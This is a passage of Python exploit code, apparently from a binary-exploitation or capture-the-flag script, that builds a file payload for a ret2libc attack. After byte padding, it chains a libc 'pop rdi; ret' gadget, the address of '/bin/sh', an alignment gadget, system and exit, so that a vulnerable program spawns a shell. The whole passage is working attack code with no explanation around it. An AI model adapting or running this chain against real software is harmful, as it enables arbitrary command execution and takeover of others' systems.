...
file_contents = b"\xf0\x9f\x91\x93\xe2\x9a\xa1"
file_contents += b"\x90" * 33
file_contents += p64(BASE_LIBC + 0x000000000002a3e5)# p64(0x401183) # pop rdi; ret;
file_contents += p64(BASE_LIBC + 0x1d8698) # address of /bin/sh
file_contents += p64(BASE_LIBC + 0x0000000000029cd6) # ret
file_contents += p64(BASE_LIBC + 0x0000000000050d60) # System
file_contents += p64(BASE_LIBC + 0x00000000000455f0) # Exit
